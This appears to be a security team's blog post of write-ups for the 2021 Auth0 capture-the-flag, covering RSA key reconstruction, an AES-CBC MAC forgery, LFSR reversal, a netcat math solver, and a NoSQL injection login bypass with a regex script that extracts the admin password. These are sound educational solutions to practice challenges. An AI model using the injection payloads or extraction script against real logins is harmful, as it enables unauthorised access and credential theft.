<!DOCTYPE html><html class="appearance-dark" lang="en"><head><meta charset="UTF-8"><title>Auth0 - CTF</title><meta name="description"><meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, initial-scale=1"><!-- Google Analytics --><!-- End Google Analytics -->
<!-- Baidu Analytics --><!-- End Baidu Analytics --><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="/style/common/bulma.css"><link rel="stylesheet" href="/style/base.css"><link rel="stylesheet" href="/style/common/helper.css"><script src="/js/common.js"></script><link rel="stylesheet" href="/style/post.css"><link rel="stylesheet" href="/style/themes/highlight-theme-light.css"><script src="/js/highlight.pack.js"></script><meta name="description" content="
The Auth0-CTF took place from the 18.10.2021 to the 25.10.2021. This was our first CTF as NocentSec, we managed to place 15th out of 613 teams with 1073 players in total as the best German team. The CTF was published by HackTheBox and organized by Auth0. Auth0 is an international enterprise which focuses on access security in web applications and well kno.."><meta name="generator" content="Hexo 5.4.0"></head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">NocentSec's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Auth0 - CTF</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Click back to the top</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/">About</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/">About</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Scoreboard"><span class="toc-text">Scoreboard</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto-Coffee-Stains"><span class="toc-text">Crypto - Coffee Stains</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Challenge-Description"><span class="toc-text">Challenge Description</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Solution"><span class="toc-text">Solution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto-Debunked"><span class="toc-text">Crypto - Debunked</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Challenge-Description-1"><span class="toc-text">Challenge Description</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Solution-1"><span class="toc-text">Solution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto-Corporate-Snake"><span class="toc-text">Crypto - Corporate Snake</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Challenge-Description-2"><span class="toc-text">Challenge Description</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Solution-2"><span class="toc-text">Solution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc-Bomb"><span class="toc-text">Misc - Bomb</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Challenge-Description-3"><span class="toc-text">Challenge Description</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Solution-3"><span class="toc-text">Solution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-Status-Board"><span class="toc-text">Web - Status Board</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Challenge-Description-4"><span class="toc-text">Challenge Description</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Solution-4"><span class="toc-text">Solution</span></a></li></ol></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/CTF"><i class="tag post-item-tag">CTF</i></a><a href="/tags/Auth0"><i class="tag post-item-tag">Auth0</i></a><a href="/tags/HackTheBox"><i class="tag post-item-tag">HackTheBox</i></a><a href="/tags/NoSQL"><i class="tag post-item-tag">NoSQL</i></a><a href="/tags/RSA"><i class="tag post-item-tag">RSA</i></a><a href="/tags/AES"><i class="tag post-item-tag">AES</i></a><a href="/tags/Crypto"><i class="tag post-item-tag">Crypto</i></a><a href="/tags/Web"><i class="tag post-item-tag">Web</i></a><a href="/tags/Misc"><i class="tag post-item-tag">Misc</i></a><a href="/tags/HTB"><i class="tag post-item-tag">HTB</i></a><a href="/tags/LFSR"><i class="tag post-item-tag">LFSR</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">Auth0 - CTF</h1><time class="has-text-grey" datetime="2021-10-27T21:46:54.000Z">2021-10-27</time><article class="mt-2 post-content"><p><img src="/2021/10/27/Auth0-CTF/header.png"></p>
<p>The Auth0-CTF took place from the 18.10.2021 to the 25.10.2021. This was our first CTF as NocentSec, we managed to place 15th out of 613 teams with 1073 players in total as the best German team. The CTF was published by <a target="_blank" rel="noopener" href="https://ctf.hackthebox.com/">HackTheBox</a> and organized by <a target="_blank" rel="noopener" href="https://auth0.com/">Auth0</a>. Auth0 is an international enterprise which focuses on access security in web applications and well known community support. This was reflected in the variety of challenges which were heavily “Web” based.</p>
<h2 id="Scoreboard"><a href="#Scoreboard" class="headerlink" title="Scoreboard"></a>Scoreboard</h2><p><img src="/2021/10/27/Auth0-CTF/scoreboard.png"></p>
<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>We were able to solve most of the challenges and especially enjoyed the web challenges. We want to showcase some challenges which we found interesting or had the feeling that we could reuse our scripts in the future for other CTFs, so this is also a knowledge database for ourselves.</p>
<h2 id="Crypto-Coffee-Stains"><a href="#Crypto-Coffee-Stains" class="headerlink" title="Crypto - Coffee Stains"></a>Crypto - Coffee Stains</h2><h3 id="Challenge-Description"><a href="#Challenge-Description" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><p>We were given an incomplete RSA private key and an encrypted message.</p>
<pre><code>-----BEGIN RSA PRIVATE KEY-----
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
tdPNybMw3fakIhDT0tCl/i00i97lFiFFNV9u0jjQmpRRc8pwcQKCAQEAy2ebe5Fl
T3s2hGUGRsMXmEF9MF48p3P6Yk0+hB0XJLgDvAVhOCylLcuzNkolj//5mYoCjjBr
4GdH5t3IAE/dBC1N8RQK/cc0FZ1DejJpV6TZUzLg6hef+tDAKMV52CWGFfc0XOWT
0MKe/e3hZzYwBgFHLeVobZu5ngkHbk+ngta2fuJ7D1Fd/IRNs7Pu3hS3JNyjcpsh
shbEezI/8eYI12dd7CiAsv4GcDnnCdSqezKa5gGk0Adige6D0wIg01FtsTX7dwla
XXXpMrb479W63xWDgFVKKzjeK7GMlO6OO8o8SNnh4s0ezSUR6za6b/yAjHPtfpFT
J+nc1AEw+qNLawKCAQEApQRXpC75Y94dnwxZqjvEIkjCFipq5NQK3sjtbo33NdiO
-
-
-
-
-
-
-
-
-
-
PS3/AoIBAHUnYBFwSB5e0yjX29DAHb85aJHUC4/p+s2wWODkaV4RIOz2PJyxoH9w
A+HmxYIC/Kt2gpGtxBt2Cl4cjZR6qcnt/hEqTNs8Qtqma2MZMCvZI7W0mT+onwHJ
FHAAAIzHPvYcXvVWs+lUR1nd0XfVqWQ4j8+07yBBt1LGWFhW/N4cLSdPQrOAizQA
9P63/RZTJQbdzKyOlJfE2eyY3PLGXjtQus7VK8eCHBlZU5bm4DX7aRT94siBk8SN
rB9SUVb+94hdyqHsf7vN8ns2OwFqxXIim0BM2fqVbA9kIHblxP3FupoAKlbmuDrC
RZZHABOiE9gwVn8oa64sDn7c5mtX2IECggEBAL9mDTqhXoAL/fXfZf1Voz7/I1hW
-
-
-
-
-
-----END RSA PRIVATE KEY-----
</code></pre>
<p><em>redacted_private_key.pem</em></p>
<p><a href="flag.enc">encrypted message</a></p>
<h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><p>We can restore some of the parameters of the RSA-encryption by comparing the incomplete key with a real key. Looking for the position and the magic numbers (described <a target="_blank" rel="noopener" href="https://ret2school.github.io/post/writeuprsa/">here</a> and <a target="_blank" rel="noopener" href="https://manylostticks.blogspot.com/2016/10/hacklu-ctf-2016-redacted-write-up.html">here</a>) we can find <code>p</code>, <code>upper_d</code>, <code>lower_q</code>, <code>dq</code> and some other fragments.</p>
<p>As this aren’t the same parameters as in the linked writeup we can’t just copy their code, but we can use our parameters with the help of <a href="mathemann.jpg">math</a>.</p>
<p><em>e is just guessed</em></p>
<p>To calculate q we replaced the d and q parameters in the script of the linked writeups:</p>
<pre><code class="py">from Crypto.Util.number import bytes_to_long, isPrime

e = 0x10001

p = 0xcb679b7b91654f7b3684650646c31798417d305e3ca773fa624d3e841d1724b803bc0561382ca52dcbb3364a258ffff9998a028e306be06747e6ddc8004fdd042d4df1140afdc734159d437a326957a4d95332e0ea179ffad0c028c579d8258615f7345ce593d0c29efdede16736300601472de5686d9bb99e09076e4fa782d6b67ee27b0f515dfc844db3b3eede14b724dca3729b21b216c47b323ff1e608d7675dec2880b2fe067039e709d4aa7b329ae601a4d0076281ee83d30220d3516db135fb77095a5d75e932b6f8efd5badf158380554a2b38de2bb18c94ee8e3bca3c48d9e1e2cd1ecd2511eb36ba6ffc808c73ed7e915327e9dcd40130faa34b6b

lower_d = 0xb5d3cdc9b330ddf6a42210d3d2d0a5fe2d348bdee5162145355f6ed238d09a945173ca7071
upper_q = 0xa50457a42ef963de1d9f0c59aa3bc42248c2162a6ae4d40adec8ed6e8df735d88e

dq = 0x7527601170481e5ed328d7dbd0c01dbf396891d40b8fe9facdb058e0e4695e1120ecf63c9cb1a07f7003e1e6c58202fcab768291adc41b760a5e1c8d947aa9c9edfe112a4cdb3c42daa66b6319302bd923b5b4993fa89f01c9147000008cc73ef61c5ef556b3e9544759ddd177d5a964388fcfb4ef2041b752c6585856fcde1c2d274f42b3808b3400f4feb7fd16532506ddccac8e9497c4d9ec98dcf2c65e3b50baced52bc7821c19595396e6e035fb6914fde2c88193c48dac1f525156fef7885dcaa1ec7fbbcdf27b363b016ac572229b404cd9fa956c0f642076e5c4fdc5ba9a002a56e6b83ac24596470013a213d830567f286bae2c0e7edce66b57d881

upper_invq_modp = 0xbf660d3aa15e800bfdf5df65fd55a33eff235856

dp = d_mod_pm1_end = 0x3d2dff

for kq in range(1, e):
    q_mul = dq * e - 1
    if q_mul % kq == 0:
        q = (q_mul // kq) + 1
        if isPrime(q):
            print(&quot;Potential q: &quot; + str(hex(q)))
            break;

n = p*q

print(&quot;potential n: &quot;)
print(hex(n))
print(&quot;#####&quot;)
print(&quot;n&quot;)
print(hex(n))
print(&quot;e&quot;)
print(hex(e))
print(&quot;p&quot;)
print(hex(p))
print(&quot;q&quot;)
print(str(hex(q)))
</code></pre>
<p><em>get_q.py</em></p>
<p>Now we have all parameters to craft a new private key with a script like that:</p>
<pre><code class="py">from Crypto.PublicKey import RSA

n = 0x831d3a77bc2df07236cd539febdf01da13942582edc7c83e5e4cfb85959647982a946286f0f395a6c6646aff486fb0b825524c08601e2a2fefa60887e4a29d463624c77a0ff3077c295413384eadb19197e08b731ed8ec8e806a1e81dd50eed15bffae5d62fa36bd93cc051617ab2e51c1a9624e634de5ef190246e54e9a398bcb97d17a5b2879210115a8e707075e881010337f25b4565ab4f65e4f92ecc3615a3e1e92528e0cad6eebd321272b7b6a801576bdfd4f8063b0fb940f0e1ef7eb21fc9017e632fa448f5f566b3509d17d2b33273ffa113f69ebc1756514bdc9782c96637e80a88fa726b6fdc5598ee2fdb77b500e50a6df037448900fe03e6da1c48f3602bda544871beae4f6d48b1f2a5e7c1e5cb4ab06fe478f22d00bcdc5d641445d979e8ede75283321d6e433134923593c7c78cdac67ea553af5f8b8aac12359880d22229118fa0360be098f03dc161c70db431dc63dc81224a809edaef0b364478f25f77836a4e510893f380962fb3ffc1e6c404ee9b4073ba662f4fddef7c1a15385e56a14d4df6886fba6a654545c399a287bfc603d582a9ff67644a5014cd7d6eb3f6ec6b90d19c90b74a45e35e8683c9020cc05bb77545cfe3fbfb9297dd011587038d15aee53737382d6e33e5757b43ca7b736b0d1cf53a74c546b28d03ba171c2d9421d0d5b8204da387102bac47412e828d04ab55483045a6265
e = 0x10001
q = 0xa50457a42ef963de1d9f0c59aa3bc42248c2162a6ae4d40adec8ed6e8df735d88e4037294db934bcd56908af941eaea6763eeeca63c5f2f05cb8bb38f689ac91e9dc13f1060446978af7950114e1be8dfeac53899e783ee9af21c44000c64b11979131bf80c152178230cc799acd1fa88184cc9d6587d6ee276d0bca083739890a9548c5358abb9f952d6c5a1f6b233008777af37923c6be12953b35f0b3542b37ef45753af6beb308bec02d650353f59b61672122b580e9ffea6a55d5f8b1e8186a18a5ce2eb403c6a72274827f284d565893c393efb5e9aa855e8523e514d5b3c30d67a75b491356463597e453fecf05a8394e84fd4ea7f2dae9ab2e78cd6f

p = 0xcb679b7b91654f7b3684650646c31798417d305e3ca773fa624d3e841d1724b803bc0561382ca52dcbb3364a258ffff9998a028e306be06747e6ddc8004fdd042d4df1140afdc734159d437a326957a4d95332e0ea179ffad0c028c579d8258615f7345ce593d0c29efdede16736300601472de5686d9bb99e09076e4fa782d6b67ee27b0f515dfc844db3b3eede14b724dca3729b21b216c47b323ff1e608d7675dec2880b2fe067039e709d4aa7b329ae601a4d0076281ee83d30220d3516db135fb77095a5d75e932b6f8efd5badf158380554a2b38de2bb18c94ee8e3bca3c48d9e1e2cd1ecd2511eb36ba6ffc808c73ed7e915327e9dcd40130faa34b6b

p=int(p)
phi = (p-1)*(q-1)
d = pow(e,-1,phi)

key = RSA.construct((n,e,d,p,q))
pem = key.exportKey(&#39;PEM&#39;)
print(pem.decode())
</code></pre>
<p><em>key.py</em></p>
<p>The new private key can be used to decrypt the given message (for example with <a target="_blank" rel="noopener" href="https://gchq.github.io/CyberChef/#recipe=RSA_Decrypt('-----BEGIN%20RSA%20PRIVATE%20KEY-----','','RSA-OAEP','SHA-1')">CyberChef</a>).</p>
<h2 id="Crypto-Debunked"><a href="#Crypto-Debunked" class="headerlink" title="Crypto - Debunked"></a>Crypto - Debunked</h2><h3 id="Challenge-Description-1"><a href="#Challenge-Description-1" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><p>This challenge is about AES in CBC mode.</p>
<p>We were given a server.py and an ip address with port for communication.<br>The application is used to authenticate keycards. Once we send a keycard with “permissionLvl=5” that gets authenticated we will receive the flag.</p>
<p>The application has two options:</p>
<ul>
<li>1 - Receive guest keycard<ul>
<li>crafts a new guest keycard based on the randomized key and iv with the plaintext <code>employeeID=ab12e&amp;permissionLvl=1</code></li>
<li>returns the guest keycard as: <code>base64(whole plaintext).base64(last 16 bytes of cyphertext).base64(IV)</code></li>
</ul>
</li>
<li>2 - Scan keycard to open door<ul>
<li>insert a keycard as: <code>base64(whole plaintext).base64(last 16 bytes of cyphertext)</code></li>
<li>returns: <ul>
<li>“Access denied” if permissionLvl != 5 and authenticated</li>
<li>“Caught forging fake keycards.” if not authenticated and “permissionLvl” in plaintext</li>
<li>expected signature (last 16 bytes of ciphertext) for given plaintext if not “permissionLvl” in plaintext</li>
</ul>
</li>
</ul>
</li>
</ul>
<pre><code class="py">from Crypto.Cipher import AES
from secret import flag
import socketserver
import os
from base64 import b64decode, b64encode
import signal

BLOCK_SIZE = 16
KEY = os.urandom(BLOCK_SIZE)
iv = os.urandom(BLOCK_SIZE)

def reportError(val, check_sig, req):
    if &quot;permissionLvl&quot; not in val.decode(&#39;utf-8&#39;, &#39;ignore&#39;):
        req.sendall(b&quot;&gt; Something went wrong, expected signature: &quot;+ check_sig.encode() +b&quot;\n&quot;)
    else:
        req.sendall(b&quot;&gt; Caught forging fake keycards. This incident has been reported!\n&quot;)

def macAuthenticate(mac, req):
    val, sig = mac.split(&quot;.&quot;)
    val = b64decode(val)
    sig = b64decode(sig).decode()
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    ct = cipher.encrypt(val)
    check_sig = ct[len(ct)-16:].hex()
    if check_sig == sig:
        return True
    else:
        reportError(val, check_sig, req)
        return False 

def createLvl1Mac(id=b&quot;ab12e&quot;):
    value = b&quot;employeeID=&quot;+id+b&quot;&amp;permissionLvl=1&quot;
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    ct = cipher.encrypt(value)
    sig = ct[len(ct)-16:].hex().encode()
    return b64encode(value)+b&quot;.&quot;+b64encode(sig)+b&quot;.&quot;+b64encode(iv.hex().encode())

def challenge(req):
    try:
        req.sendall(b&#39;|------------------------------|\n&#39;+
                    b&#39;|     KEYCARD ID CHECKER       |\n&#39;+
                    b&#39;|------------------------------|\n&#39;+
                    b&#39;|1. Receive guest keycard      |\n&#39;+
                    b&#39;|2. Scan keycard to open door  |\n&#39;+
                    b&#39;|------------------------------|\n&#39;+
                    b&#39;\n&gt; &#39;
                    )
        choice = int(req.recv(2).decode().strip())
        if choice == 1:
            req.sendall(b&quot;&gt; Keycard ID: &quot;+createLvl1Mac()+b&quot;\n&quot;)
        if choice == 2:
            req.sendall(b&#39;&gt; Press keycard to the scanner...\n&#39;)
            mac = req.recv(4096).decode().strip()
            if macAuthenticate(mac, req):
                val, _ = mac.split(&quot;.&quot;)
                val = b64decode(val).decode()
                val = dict(x.split(&quot;=&quot;) for x in val.split(&quot;&amp;&quot;))
                if int(val.get(&#39;permissionLvl&#39;)) == 5:
                    req.sendall(b&quot;&gt; Access granted! No alien robots here: &quot;+ flag+b&quot;\n&quot;)
                else:
                    req.sendall(b&quot;&gt; Access denied!&quot;+b&quot;\n&quot;)
    
    except Exception as e:
        try:
            req.sendall(b&#39;Unexpected error.\n&#39;)
            req.close()
        except:
            pass
        exit()

class incoming(socketserver.BaseRequestHandler):
    def handle(self):
        signal.alarm(300)
        req = self.request
        while True:
            challenge(req)

class ReusableTCPServer(socketserver.ForkingMixIn, socketserver.TCPServer):
    pass

socketserver.TCPServer.allow_reuse_address = False
server = ReusableTCPServer((&quot;0.0.0.0&quot;, 1337), incoming)
server.serve_forever()
</code></pre>
<p><em>server.py</em></p>
<p><img src="/2021/10/27/Auth0-CTF/standard.png"></p>
<h3 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h3><p><em>This challenge is kind of interesting because it’s not the expected bit-flipping attack to use here. This is caused by the use of a compare of encryptions for authentication instead of decryption.</em></p>
<p>We want to craft a keycard with “permissionLvl=5” and a valid ciphertext to use as the signature.<br>Sending a random plaintext (<em>length in bytes should be a factor of 16</em>) and a random ciphertext gives us the possibility to craft keycards by using the given expected signature in base64 as ciphertext.</p>
<p>It’s not necessary to have something about the employeID in the plaintext as only the permissionLvl gets checked. The only problem here is that we can’t just send “&amp;permissionLvl=5” as we would get the “caught forging keycards”-error instead of the expected signature. </p>
<p>We know the IV because it gets send to us in the applications response. This also means that we can control the output of our input XORed with the IV.<br>We can calculate which ciphertext the second plaintext (<em>second encrpytion step</em>) gets XORed with by crafting a new keycard.</p>
<p><img src="/2021/10/27/Auth0-CTF/encAES.png"></p>
<p>The key element here is to break out of thinking in 16 byte blocks. By this we can send parts of “permissionLvl=5” to bypass the check.</p>
<p>Following way leads us to a valid keycard:</p>
<ul>
<li>choose a plaintext for access like: 0000=0000&amp;permissionLvl=5&amp;00=000<ul>
<li>mind that this is 32 bytes long and neither in the first nor the second block is the whole “permissionLvl”</li>
<li>we need to add the symbols “=” and “&amp;” to get along with the splits</li>
</ul>
</li>
<li>C1: calculate the signature of the first 16 bytes of plaintext (“0000=0000&amp;permis”) by sending this as a keycard with a random ciphertext <ul>
<li>this returns a new signature which would be the first ciphertext in an encryption of a 32byte plaintext</li>
</ul>
</li>
<li>C2: calculate the signature of the last 16 bytes of plaintext (“sionLvl=5&amp;00=000”) by <strong>simulating the second step in encryption</strong>:<ul>
<li>eliminating the IV: new plaintext = “sionLvl=5&amp;00=000” XOR IV</li>
<li>new plaintext = new plaintext XOR C1 (<em>signature of first plaintext</em>)</li>
<li>sending this new plaintext in a keycard with a random cipher to get the signature</li>
</ul>
</li>
</ul>
<p>This got us the signature of the whole plaintext: C2.<br>Now we can just enter our valid keycard:</p>
<p><code>base64(&quot;0000=0000&amp;permissionLvl=5&amp;00=000&quot;).base64(C2)</code></p>
<h2 id="Crypto-Corporate-Snake"><a href="#Crypto-Corporate-Snake" class="headerlink" title="Crypto - Corporate Snake"></a>Crypto - Corporate Snake</h2><h3 id="Challenge-Description-2"><a href="#Challenge-Description-2" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><p>We were given an encryption python script and a corresponding ciphertext. Our challenge was to reverse that ciphertext and retrieve the flag.</p>
<pre><code class="py">from base64 import b64encode
import os

def bytes_to_bits(input):
    return &#39;&#39;.join(format(i, &#39;08b&#39;) for i in input)
def bits_to_bytes(input):
    return int(input, 2).to_bytes((len(input) + 7) // 8, byteorder=&#39;big&#39;)

flag = b&quot;--MISSING--&quot;
init_state = os.urandom(4)

def lfsr_keystream_generator(init_state, flag_bits_length, taps):
    state = init_state
    keystream = &#39;&#39;
    for i in range(flag_bits_length):
        keystream = keystream + state[-1]
        state = state[:-1]
        bit = state[taps[0]]
        for tap in taps[1:]:
            bit = int(bit) ^ int(state[tap])
        state = str(bit) + state
    return keystream

def encrypt(keystream, plaintext):
    plaintext = bytes_to_bits(plaintext)
    ciphertext = &#39;&#39;
    for i in range(len(plaintext)):
        xored_bit = int(keystream[i]) ^ int(plaintext[i])
        ciphertext = ciphertext + str(xored_bit)
    return b64encode(bits_to_bytes(ciphertext))


keystream = lfsr_keystream_generator(bytes_to_bits(init_state), len(bytes_to_bits(flag)),[2,3,5,7,11,17,19,29])
ciphertext = encrypt(keystream, flag)
print(ciphertext)
</code></pre>
<p><em>enc.py</em></p>
<pre><code>+YXkzFFU86WugkASUernSAJz6ZSyFLHxrtba8wQVq3GRrjr7cib/3+9lt3JmtjKRhwFk/Q==
</code></pre>
<p><em>ciphertext</em></p>
<h3 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution"></a>Solution</h3><p>The encryption script generates a <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Linear-feedback_shift_register">lfsr keystream</a> using a random init state by calling <code>os.random(4)</code>. Since we were given the encryption script we pretty much translated it to a solution script by reversing the transformation line by line. This was possible because we can recover the inital state by reversing the first 32bits of the restored keystream and also because we were given the taps used.</p>
<pre><code class="py"># Imports
from base64 import b64encode, b64decode
import os

# Functions
def bytes_to_bits(input):
    return &#39;&#39;.join(format(i, &#39;08b&#39;) for i in input)
def bits_to_bytes(input):
    return int(input, 2).to_bytes((len(input) + 7) // 8, byteorder=&#39;big&#39;)
def lfsr_keystream_generator(init_state, flag_bits_length, taps):
    state = init_state
    keystream = &#39;&#39;
    for i in range(flag_bits_length):
        keystream = keystream + state[-1]
        state = state[:-1]
        bit = state[taps[0]]
        for tap in taps[1:]:
            bit = int(bit) ^ int(state[tap])
        state = str(bit) + state
    return keystream

# Variables
ciphertext=b&quot;+YXkzFFU86WugkASUernSAJz6ZSyFLHxrtba8wQVq3GRrjr7cib/3+9lt3JmtjKRhwFk/Q==&quot;
ciphertextbits=bytes_to_bits(b64decode(ciphertext))

flag=b&quot;HTB&#123;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&#125;&quot;
flagbits = bytes_to_bits(flag)

# Restoring keystream
keystream_temp=&quot;&quot;
for bit in range(len(ciphertextbits)):
    xored_bit = int(ciphertextbits[bit]) ^ int(flagbits[bit])
    keystream_temp = keystream_temp + str(xored_bit)

keystream_first32bits = keystream_temp[:32]
keystream_last8bits = keystream_temp[-8:]

# Recovering inital state
intial_state=keystream_first32bits[::-1]

# Decryption
keystream_restored=lfsr_keystream_generator(intial_state, 416, [2,3,5,7,11,17,19,29])

plainbits=&quot;&quot;
for bit in range(len(ciphertextbits)):
    xored_bit = int(ciphertextbits[bit]) ^ int(keystream_restored[bit])
    plainbits = plainbits + str(xored_bit)

plaintext=bits_to_bytes(plainbits)
print(plaintext)
</code></pre>
<p><em>solve.py</em></p>
<h2 id="Misc-Bomb"><a href="#Misc-Bomb" class="headerlink" title="Misc - Bomb"></a>Misc - Bomb</h2><h3 id="Challenge-Description-3"><a href="#Challenge-Description-3" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><p>We were given an ip adress with a port. Once connected via netcat we were asked to solve 777 maths challenges in order to retrieve the flag.</p>
<h3 id="Solution-3"><a href="#Solution-3" class="headerlink" title="Solution"></a>Solution</h3><p>While this isn’t a difficult or very exciting challenge we decided to share our script here nontheless because this is quite a common ctf challenge and we might reuse it in the future.</p>
<pre><code class="py">#!/usr/bin/python3

import itertools
import nclib
import sys
import collections
from time import time


ip = &#39;167.99.202.9&#39;
port = 32597


### connecting to the socket and recieving until &#39;= ?&#39;:
nc = nclib.Netcat((ip, port), verbose=True)
start = &quot;= ?&quot;
recv = nc.recv_until(start.encode(&#39;utf-8&#39;))

### splitting the task to get rid of the useless information
text, term = recv.decode().split(&#39;\n\n&#39;)

### evaluate the solution and send it
solution= eval(term[:-4])
nc.send(str(solution) + &#39;\n&#39;)

### do all of the above repeatedly
while 1:
    recv = nc.recv_until(start.encode(&#39;utf-8&#39;))
    a, b, term = recv.decode().split(&#39;\n\n&#39;)
    solution= eval(term[:-4])
    print (term)
    print (solution)
    nc.send(str(solution) + &#39;\n&#39;)
</code></pre>
<p><em>bomb.py</em></p>
<h2 id="Web-Status-Board"><a href="#Web-Status-Board" class="headerlink" title="Web - Status Board"></a>Web - Status Board</h2><p><img src="/2021/10/27/Auth0-CTF/statusboard_admin.png"></p>
<h3 id="Challenge-Description-4"><a href="#Challenge-Description-4" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><p>What looks like a simple authentication bypass in the first place is not what it seems. In this challenge our task wasn’t to just bypass the login form, we had to retrieve the admin password. This became clear looking at the <code>entrypoint.sh</code> which we were given.</p>
<pre><code class="sh">#!/bin/ash

# Secure entrypoint
chmod 600 /entrypoint.sh
mkdir /tmp/mongodb
mongod --noauth --dbpath /tmp/mongodb/ &amp;
sleep 2
mongo status_board --eval &quot;db.createCollection(&#39;users&#39;)&quot;
mongo status_board --eval &#39;db.users.insert( &#123; username: &quot;admin&quot;, password: &quot;HTB&#123;f4k3_fl4g_f0r_t3st1ng&#125;&quot;&#125; )&#39;
/usr/bin/supervisord -c /etc/supervisord.conf
</code></pre>
<p><em>entrypoint.sh</em></p>
<h3 id="Solution-4"><a href="#Solution-4" class="headerlink" title="Solution"></a>Solution</h3><p>The vulnerabiliy is called NoSQL Injection or MongoDB Injection. We found out that we could successful “login” using this:</p>
<pre><code class="json">&#123;
    &quot;email&quot; : &#123;&quot;$gt&quot;:&quot;&quot;&#125;,
    &quot;password&quot; : &#123;&quot;$gt&quot;:&quot;&quot;&#125;
&#125;
</code></pre>
<p><code>$gt</code> means <code>greater than</code>, so in this case it would pick any username that is <code>greater than nothing</code> and the corresponding password. This gave us confidence about this attack. However the challenge here was to extract the password because that’s were the flag is stored. So we figured we can also use regex to enumerate the flag character by character. As long as the following returns <code>User authenticated successfully!</code> we’ve only put in valid characters.</p>
<pre><code class="json">&#123;
    &quot;username&quot; : &#123;&quot;$eq&quot;:&quot;admin&quot;&#125;,
    &quot;password&quot; : &#123;&quot;$regex&quot;:&quot;^HTB&#123;&quot;&#125;
&#125;
</code></pre>
<p>Because that would be quite painful to do by hand we wrote this short script which tries every character in the given alphabet and continues to the next one after the response would not include the word <code>Invalid</code>.</p>
<pre><code class="py">#!/usr/bin/env python3

import requests

url = &#39;http://167.99.94.53:30169/api/login&#39;
alphabet=&quot;AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789_&#123;&#125;&quot;
solved=&quot;&quot;

while 1:
    for c in alphabet:
        myobj = &#123;&#39;username&#39;: &#39;admin&#39;,&#39;password&#39; : &#123;&quot;$regex&quot;:&quot;^&quot;+solved+c&#125;&#125;

        x = requests.post(url, json = myobj)
        if &quot;Invalid&quot; not in x.text:
            solved=solved + c
            print(solved)
</code></pre>
<p><em>nosql.py</em>  </p>
<p><em>Thanks for reading. ~ hexp and JeanWhisky</em></p>
</article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><a class="button is-default" href="/2021/11/22/HTB-Uni-CTF-2021-Quals/" title="HTB Uni CTF 2021 Quals"><i class="iconfont icon-prev mr-2 has-text-grey"></i><span class="has-text-weight-semibold">Previous: HTB Uni CTF 2021 Quals</span></a></section><article class="mt-6 comment-container"><script async repo="NocentSec/nocentsec.github.io" src="https://utteranc.es/client.js" issue-term="pathname" theme="preferred-color-scheme"></script></article></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/NocentSec"><i class="iconfont icon-github"></i></a><!-- Ins--><!-- RSS--><!-- 知乎--><!-- 领英--><!-- 脸书--></section><p><span>Copyright ©</span><span> NocentSec 2021</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><p>Powered by Hexo &verbar;&nbsp;</p><p class="is-flex 